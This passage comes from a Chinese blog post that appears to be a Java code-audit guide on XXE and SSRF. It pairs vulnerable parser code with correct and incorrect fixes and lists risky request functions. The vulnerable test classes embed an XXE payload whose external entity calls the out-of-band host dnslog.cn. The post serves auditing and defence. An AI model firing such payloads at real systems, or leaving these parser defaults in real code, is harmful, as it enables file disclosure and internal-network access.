class="comment">// 使用InputSource包装XML字符串</span></span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>();</span><br><span class="line">inputSource.setCharacterStream(<span class="keyword">new</span> <span class="title class_">java</span>.io.StringReader(xml));</span><br><span class="line"><span class="comment">// 解析XML</span></span><br><span class="line">xmlReader.parse(inputSource);</span><br></pre></td></tr></table></figure>
<p>这么一看，其实修复<code>XXE</code>漏洞很简单，只要加上<code>setFeature</code>即可。反之，审计的时候，定位相关的<code>xml</code>处理函数，查看是否进行了<code>setFeature</code>操作，即可得到是否存在<code>XXE</code>漏洞。</p>
<h4 id="org-jdom2-input-SAXBuilder">org.jdom2.input.SAXBuilder</h4>
<p><code>SAXBuilder</code>如果使用默认配置就会触发<code>XXE</code>漏洞。</p>
<p>存在<code>XXE</code>漏洞的情况。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.vultest;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SAXBuilderXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line">            <span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">            builder.build(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>pom.xml</code>中引入依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jdom<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdom2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>不存在<code>XXE</code>漏洞的情况。</p>
<ul>
<li>方式一</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.build(InputSource);</span><br></pre></td></tr></table></figure>
<ul>
<li>方式二</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.build(InputSource);</span><br></pre></td></tr></table></figure>
<h4 id="org-dom4j-io-SAXReader">org.dom4j.io.SAXReader</h4>
<p>在默认情况下会出现<code>XXE</code>漏洞。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SAXReader saxReader = new SAXReader();</span><br><span class="line">saxReader.read(InputSource);</span><br></pre></td></tr></table></figure>
<p>不存在<code>XXE</code>漏洞的情况。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXReader</span> <span class="variable">saxReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.read(InputSource);</span><br></pre></td></tr></table></figure>
<h4 id="javax-xml-parsers-DocumentBuilder">javax.xml.parsers.DocumentBuilder</h4>
<p>存在<code>XXE</code>漏洞的测试代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.vultest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Element;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DocumentBuilderFactoryXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// 创建DocumentBuilderFactory实例</span></span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            <span class="comment">// 创建DocumentBuilder实例</span></span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">            <span class="comment">// 解析XML字符串</span></span><br><span class="line">            <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> builder.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br><span class="line">            document.getDocumentElement().normalize();</span><br><span class="line">            <span class="comment">// 获取根元素</span></span><br><span class="line">            <span class="type">Element</span> <span class="variable">root</span> <span class="operator">=</span> document.getDocumentElement();</span><br><span class="line">            System.out.println(<span class="string">&quot;Root element: &quot;</span> + root.getTagName());</span><br><span class="line">            <span class="comment">// 遍历子节点</span></span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nodeList</span> <span class="operator">=</span> root.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodeList.getLength(); i++) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nodeList.item(i);</span><br><span class="line">                <span class="keyword">if</span> (node.getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Node: &quot;</span> + node.getNodeName() + <span class="string">&quot; , Text: &quot;</span> + node.getTextContent());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParserConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SAXException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>错误的修复。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"><span class="type">String</span> <span class="variable">FEATURE</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">FEATURE = <span class="string">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">dbf.setXIncludeAware(<span class="literal">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 读取xml文件内容</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;path/to/xxexml&quot;</span>);</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(fis);</span><br><span class="line">builder.parse(is);</span><br></pre></td></tr></table></figure>
<p>看似设置得很很全面，但是直接仍然会被攻击，原因就是在于<code>DocumentBuilder builder = dbf.newDocumentBuilder();</code>这行代码需要在<code>dbf.setFeature()</code>之后才能够生效；⚠️⚠️⚠️</p>
<p><strong>正确的修复</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line"><span class="type">String</span> <span class="variable">FEATURE</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">FEATURE = <span class="string">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">dbf.setXIncludeAware(<span class="literal">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"><span class="comment">// 读取xml文件内容</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;path/to/xxexml&quot;</span>);</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(fis);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(is);</span><br></pre></td></tr></table></figure>
<p>注意<code>DocumentBuilder builder = dbf.newDocumentBuilder();</code>在两种不同的位置的差异性。</p>
<h4 id="其它同理">其它同理</h4>
<p>通过对不同的<code>XML</code>解析库的修复方式可以发现，<code>XXE</code>的防护只需要限制带外实体的注入就可以了，修复方式也简单，需要设置几个选项为<code>false</code>即可，可能少许的几个库可能还需要设置一些其他的配置，但是都是类似的。</p>
<p>总体来说修复方式都是通过<code>setFeature</code>的方式来防御<code>XXE</code>。</p>
<ul>
<li>方法一</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true </span><br><span class="line">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false</span><br><span class="line">&quot;http://xml.org/sax/features/external-general-entities&quot;, false</span><br><span class="line">&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false</span><br></pre></td></tr></table></figure>
<ul>
<li>方式二</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;</span><br><span class="line">XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;</span><br></pre></td></tr></table></figure>
<p>本质上<code>XXE</code>的问题就是一个配置不当的问题，即容易发现也容易防御，但是前提是需要知道这个漏洞。很多程序员并不知道<code>XXE</code>，所以才会写出含有漏洞的代码。</p>
<h2 id="SSRF">SSRF</h2>
<blockquote>
<p><code>SSRF</code>漏洞其实就是代码中有一个可以访问内网的接口，用户可以通过控制这个请求的接口，进而访问内网。<code>SSRF</code>不只是仅限于代码中请求<code>URL</code>的函数，<code>XXE</code>也可以作为<code>SSRF</code>的接口的，还有一些代码可以解析<code>xml</code>，<code>html</code>等文件，通过控制这些文件的内容也是可以实现<code>SSRF</code>。</p>
</blockquote>
<p>在<code>Java</code>中支持的协议类型</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http https file ftp mailto jar netdoc</span><br></pre></td></tr></table></figure>
<h3 id="可能存在问题的函数">可能存在问题的函数</h3>
<p>代码中常用的可能存在<code>SSRF</code>的函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URLConnection.getInputStream</span><br><span class="line">HttpVlient.execute</span><br><span class="line">Request.Get.execute</span><br><span class="line">Request.Post.execute</span><br><span class="line">URL.openStream</span><br><span class="line">ImageIO.read</span><br></pre></td></tr></table></figure>
<p>根据函数名称，快速定位函数，分析函数的参数是否可控，进而确认是否存在<code>SSRF</code>漏洞。</p>
<h3 id="测试实例-2">测试实例</h3>
<h4 id="HttpURLConnection-getInputStream">HttpURLConnection.getInputStream</h4>
<p>就是<code>URL</code>可控就行了，比较简单。有时候会存在对<code>URL</code>过滤的情况，这时候需要进行绕过，可以参考我之前写的<code>SSRF</code>绕过内容<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.ssrf;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpURLConnectionSSRF</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//假设这里是用户可控的URL</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">targetUrl</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1&quot;</span>;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(targetUrl);</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">            <span class="comment">//获取输入流，并读取响应</span></span><br><span class="line">            <span class="keyword">try</span>(<span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(connection.getInputStream())))&#123;</span><br><span class="line">                String inputLine;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="keyword">while</span>((inputLine = in.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    content.append(inputLine);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(content.toString());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//关闭连接</span></span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="HttpCLient-execute">HttpCLient.execute</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.ssrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.CloseableHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.HttpGet;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.HttpClients;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpClientSSRF</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//创建HttpClient实例</span></span><br><span class="line">        <span class="keyword">try</span>(<span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClients.createDefault()) &#123;</span><br><span class="line">            <span class="comment">// 创建HttpGet实例</span></span><br><span class="line">            <span class="type">HttpGet</span> <span class="variable">http</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;http://115.120.233.255:8787&quot;</span>);</span><br><span class="line">            <span class="comment">// 执行请求并获取响应</span></span><br><span class="line">            <span class="keyword">try</span>(<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> httpClient.execute(http)) &#123;</span><br><span class="line">                <span class="comment">//检查响应状态码</span></span><br><span class="line">                <span class="keyword">if</span>(response.getStatusLine().getStatusCode()==<span class="number">200</span>)&#123;</span><br><span class="line">                    <span class="comment">//读取响应内容</span></span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(response.getEntity().getContent()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">body</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                        body.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">&quot;response body: &quot;</span>+body.toString());</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;request failed: &quot;</span>+response.getStatusLine().getStatusCode());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="其它同理-2">其它同理</h4>
<p>比较简单，这里就不再举例。</p>
<h2 id="RCE">RCE</h2>
<h2 id="参考">参考</h2>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.runoob.com/servlet/servlet-life-cycle.html">https://www.runoob.com/servlet/servlet-life-cycle.html</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9w4Rzr-P1ph41VSCmmc_Hg">https://mp.weixin.qq.com/s/9w4Rzr-P1ph41VSCmmc_Hg</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://r17a-17.github.io/2021/09/04/Java-XXE漏洞总结/</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2018/10/23/java-xxe/">https://blog.spoock.com/2018/10/23/java-xxe/</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn5" class="footnote-item"><p><a href="https://x2nn.github.io/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/#SSRF%E7%9A%84%E7%BB%95%E8%BF%87">https://x2nn.github.io/2024/07/25/SSRF漏洞篇/#SSRF的绕过</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
